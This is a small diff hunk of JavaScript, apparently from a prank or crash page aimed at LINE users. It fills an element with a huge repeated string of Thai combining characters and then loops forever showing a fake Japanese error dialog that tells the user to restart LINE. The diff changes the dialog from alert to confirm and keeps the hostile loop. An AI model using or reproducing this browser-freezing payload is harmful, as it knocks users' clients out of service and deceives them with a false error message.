@@ -70,7 +70,7 @@
         let e="ิิิิิิิิิิิิิิิ".repeat(10000)+"<br>";
         document.getElementById("aaa").innerHTML=e;
         while(true){
-            alert('エラー:ファイルの読み込みに失敗しました。LINEを再起動してください。');
+            window.confirm('エラー:ファイルの読み込みに失敗しました。LINEを再起動してください。');
         }}
         timeoutID = window.setTimeout( fuck, 2000 )
     })
